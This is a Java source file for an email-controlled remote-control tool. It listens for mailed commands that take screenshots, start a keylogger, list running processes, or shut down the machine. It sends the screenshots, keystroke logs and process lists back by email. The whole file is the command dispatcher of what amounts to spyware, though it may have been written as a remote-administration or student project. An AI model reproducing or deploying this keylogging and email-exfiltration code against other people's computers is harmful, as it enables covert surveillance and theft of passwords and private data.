package email;

import javax.mail.MessagingException;
import java.io.IOException;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
public class Main {
    private static int takeScreenshot(int id){
        String subject = "res/" + id;
        try {
            SendMail.getInstance().Send(subject, "",ScreenShot.getInstance().takeScreenShot());
            return 1;
        } catch (IOException | MessagingException e) {
            e.printStackTrace();
            return 0;
        }
    }
    private static int keyLog(int id,String flag){
        if (!flag.equalsIgnoreCase("Start")) return 3;
        String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
        try {
            KeyLogger.getInstance().startLog(filename);
            String subject = "res / " + id;
            SendMail.getInstance().Send(subject,"", filename);
            return 1;
        } catch (IOException e) {
            System.out.println("Error log");
            e.printStackTrace();
            return 0;
        } catch (MessagingException e) {
            System.out.println("Cannot send mail");
            e.printStackTrace();
            return 0;
        }
    }
    private static int Shutdown(int id, String sudopass){
        try{
            LogoutandShut.getInstance().Logout(sudopass);
            return 1;
        }catch (Exception e){
            String subject = "res / " + id;
            try {
                SendMail.getInstance().Send(subject, "Can't Shutdown due to error: " + e.toString(), null);
            }catch (IOException | MessagingException er){
                er.printStackTrace();
            }
            e.printStackTrace();
            return 0;
        }
    }
    private static int ListProcess(int id){
        String subject = "res/"+id;
        try{
            SendMail.getInstance().Send(subject,"", ProcessPC.getInstance().ProcessList());
            return 1;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return 0;
        }
    }
    public static int processRequest(String header) throws ArrayIndexOutOfBoundsException{
        String[] parts = header.split("/");
        System.out.println(Arrays.toString(parts));
        int id = Integer.parseInt(parts[1].trim());
        String command = parts[2].trim();
        if (command.equalsIgnoreCase("takeshot")) {
            return takeScreenshot(id);
        }
        else if (command.equalsIgnoreCase("keylog")) {
            return keyLog(id,parts[3].trim());
        }
        else if (command.equalsIgnoreCase("Shutdown")){
            if (parts.length > 3)
                return Shutdown(id,parts[3].trim());
            return Shutdown(id,"");
        }else if(command.equalsIgnoreCase("Logout")){
            return 2;
        }
        else if (command.equalsIgnoreCase("ListProcess")) {
            return ListProcess(id);
        }
        return 0;
    }
    public static void main(String[] args) {
        System.out.println("Listeningg for request...");
        CheckMail.getInstance().listen();
    }

}
